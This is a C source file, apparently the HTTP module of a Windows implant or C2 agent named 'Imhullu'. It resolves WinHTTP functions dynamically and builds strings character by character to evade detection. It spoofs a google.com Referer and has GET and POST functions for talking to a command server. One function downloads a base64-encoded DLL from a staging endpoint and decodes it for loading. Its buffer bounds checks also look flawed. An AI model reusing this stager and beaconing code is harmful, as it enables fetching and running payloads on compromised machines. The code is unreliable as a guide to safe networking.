#include "../include/http.h"

// will be overriden by ImhulluCLI
//#define SERVER '1','9','2','.','1','6','8','.','0','.','1',0
//#define PORT 5001

CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
{
    WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };
    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
    WCHAR wProxy[] = { 'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0 };
    WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };

    DWORD dwBufferSize = 0;

    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
    (
        wUserAgent,
        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
        wProxy,
        wProxyBypass,
        0
    );

    #ifdef DEBUG
    if (hSession == NULL)
    {
        WCHAR error[] = { 'O', 'p', 'e', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)
    (
        hSession,
        wcServer,
        port,
        0
    );

    #ifdef DEBUG
    if (hConnect == NULL)
    {
        WCHAR error[] = { 'C', 'o', 'n', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
    (
        hConnect,
        wVerb,
        wcPath,
        wVersion,
        wReferer,
        NULL,
        0
    );

    #ifdef DEBUG
    if (hRequest == NULL)
    {
        CHAR error[] = { 'R', 'e', 'q', 'F', '\n', 0 };
        ((PRINTF)api->printf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->printf)(myFormat2, errorCode);
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
    }
    #endif

    // Send the request
    BOOL reqSuccess = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)
    (
        hRequest,
        NULL,
        0,
        NULL,
        0, 0, 0
    );

    #ifdef DEBUG
    if (reqSuccess == FALSE)
    {
        WCHAR error[] = { 'S', 'e', 'n', 'd', 'F', '\n', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    BOOL rcvResponse = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
    #ifdef DEBUG
    if (rcvResponse == FALSE)
    {
        WCHAR error[] = { 'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(error, rcvResponse);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    LPVOID lpContentLength = NULL;
    DWORD dwBufferLength = 0;
    BOOL result = FALSE;

    // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
    ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
    (
        hRequest,
        WINHTTP_QUERY_CONTENT_LENGTH,
        WINHTTP_HEADER_NAME_BY_INDEX,
        NULL,
        &dwBufferLength,
        WINHTTP_NO_HEADER_INDEX
    );

    if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
    {
        // Allocate the calculated buffer
        lpContentLength = ((MALLOC)api->malloc)(dwBufferLength/sizeof(WCHAR));

        result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
        (
            hRequest,
            WINHTTP_QUERY_CONTENT_LENGTH,
            WINHTTP_HEADER_NAME_BY_INDEX,
            lpContentLength,
            &dwBufferLength,
            WINHTTP_NO_HEADER_INDEX
        );
    }

    if (result)
    {
        dwBufferSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
    }
    else
    {
        #ifdef DEBUG
        CHAR error[] = { 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', ' ', 'F', 'a', 'i', 'l', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
        #endif
    }

    CHAR* cpBuffer = (CHAR*)((CALLOC)api->calloc)((size_t)(dwBufferSize), (size_t)sizeof(WCHAR));
    DWORD bufferIndexChange = 0;
    DWORD availableBytes = 0;
    DWORD actuallyRead = 0;
    LPDWORD lpActuallyRead = &actuallyRead;
    BOOL readSuccess = FALSE;

    while(((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0)
    {
        readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)
        (
            hRequest,
            (LPVOID)(cpBuffer+bufferIndexChange),
            availableBytes,
            lpActuallyRead
        );

        // Check for buffer overflow risk
        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwBufferSize / sizeof(WCHAR))
        { break; }

        bufferIndexChange += availableBytes/sizeof(WCHAR);
    }

    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);

    if (readSuccess)
    { return cpBuffer; }
    return NULL;
}

void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, CHAR* data)
{
    LPSTR pszData = (LPSTR)data;
    BOOL bResults = FALSE;

    WCHAR wVerb[] = { 'P', 'O', 'S', 'T', 0 };

    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };

    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };

    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };

    WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
    WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
    WCHAR contentType[] = { 'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e', ':', ' ', 'a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '/', 'j', 's', 'o', 'n', 0 };

    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
    (
        wUserAgent,
        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
        wProxy,
        wProxyBypass,
        0
    );

    if (hSession)
    {
        // Specify an HTTP server
        HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)(hSession, server, port, 0);

        if (hConnect) {
            // Create an HTTP request handle
            #define WINHTTP_FLAG_REFRESH 0x00000100
            HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
            (
                hConnect,
                wVerb,
                endpoint,
                wVersion,
                wReferer,
                NULL,
                WINHTTP_FLAG_REFRESH
            );

            if (hRequest)
            {
                // Send the request
                bResults = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)
                (
                    hRequest,
                    contentType,
                    0,
                    (LPVOID)pszData,
                    myStrlenA(pszData),
                    myStrlenA(pszData),
                    0
                );

                // Wait for the response
                if (bResults)
                { bResults = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL); }
            }
            ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
        }
        ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
    }
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);
}

LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint, WCHAR* wServer, INTERNET_PORT dwPort)
{
    WCHAR wVerb[] = { 'G', 'E', 'T', 0 };

    //WCHAR wEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };

    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };

    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };

    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };

    // Home
    //WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };

    // School
    //WCHAR wServer[] = { '1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0 };

    // Host-Only
    // WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };

    WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
    WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };

    DWORD dwEncodedDllSize = 0;

    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
    (
        wUserAgent,
        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
        wProxy,
        wProxyBypass,
        0
    );

    #ifdef DEBUG
    if (hSession == NULL)
    {
        WCHAR error[] = { 'O', 'p', 'e', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)
    (
        hSession,
        wServer,
        dwPort,
        0
    );

    #ifdef DEBUG
    if (hConnect == NULL)
    {
        WCHAR error[] = { 'C', 'o', 'n', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
    (
        hConnect,
        wVerb,
        wEndpoint,
        wVersion,
        wReferer,
        NULL,
        0
    );

    #ifdef DEBUG
    if (hRequest == NULL)
    {
        CHAR error[] = { 'R', 'e', 'q', 'F', '\n', 0 };
        ((PRINTF)api->printf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->printf)(myFormat2, errorCode);
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
    }
    #endif

    // Send the request
    BOOL reqSuccess = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)(
        hRequest,
        NULL,
        0,
        NULL,
        0, 0, 0
    );

    #ifdef DEBUG
    if (reqSuccess == FALSE)
    {
        WCHAR error[] = { 'S', 'e', 'n', 'd', 'F', '\n', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    BOOL rcvResponse = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
    #ifdef DEBUG
    if (rcvResponse == FALSE)
    {
        WCHAR error[] = { 'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(error, rcvResponse);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    LPVOID lpContentLength = NULL;
    DWORD dwBufferLength = 0;
    BOOL result = FALSE;

    // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
    ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
    (
        hRequest,
        WINHTTP_QUERY_CONTENT_LENGTH,
        WINHTTP_HEADER_NAME_BY_INDEX,
        NULL,
        &dwBufferLength,
        WINHTTP_NO_HEADER_INDEX
    );

    if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
    {
        // Allocate the calculated buffer
        lpContentLength = ((MALLOC)api->malloc)(dwBufferLength/sizeof(WCHAR));

        result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
        (
            hRequest,
            WINHTTP_QUERY_CONTENT_LENGTH,
            WINHTTP_HEADER_NAME_BY_INDEX,
            lpContentLength,
            &dwBufferLength,
            WINHTTP_NO_HEADER_INDEX
        );
    }

    if (result)
    {
        dwEncodedDllSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
    }
    else
    {
        #ifdef DEBUG
        CHAR error[] = { 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', ' ', 'F', 'a', 'i', 'l', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
        #endif
    }

    LPVOID lpEncodedBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)(dwEncodedDllSize), (size_t)sizeof(WCHAR));
    WCHAR* wcEncodedBuffer = (WCHAR*)lpEncodedBuffer;
    DWORD bufferIndexChange = 0;
    DWORD availableBytes = 0;
    DWORD actuallyRead = 0;
    LPDWORD lpActuallyRead = &actuallyRead;
  
    while( ((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0 )
    {
        BOOL readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)
        (
            hRequest,
            (LPVOID)(wcEncodedBuffer+bufferIndexChange),
            availableBytes,
            lpActuallyRead
        );

        if (!readSuccess)
        {
            #ifdef DEBUG
            CHAR whrdFailed[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 'F' };
            ((MESSAGEBOXA)api->MessageBoxA)(0, whrdFailed, whrdFailed, 0x0L);
            #endif
        }

        // Check for buffer overflow risk
        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwEncodedDllSize / sizeof(WCHAR))
        { break; }

        bufferIndexChange += availableBytes/sizeof(WCHAR);
    }

    *pdwDllSize = base64_raw_size(dwEncodedDllSize);
    LPVOID lpRawBuffer = (LPVOID)(((CALLOC)api->calloc)(*pdwDllSize, (size_t)sizeof(CHAR)));

    DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
    (
        lpEncodedBuffer,
        dwEncodedDllSize,
        0x000000001,
        lpRawBuffer,
        pdwDllSize,
        NULL,
        NULL
    );

    ((FREE)api->free)(lpEncodedBuffer);
    ((FREE)api->free)(lpContentLength);

    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);

    if (lpRawBuffer != NULL && lengthBuffer)
    { return lpRawBuffer; }
    else
    { return 0;}
}
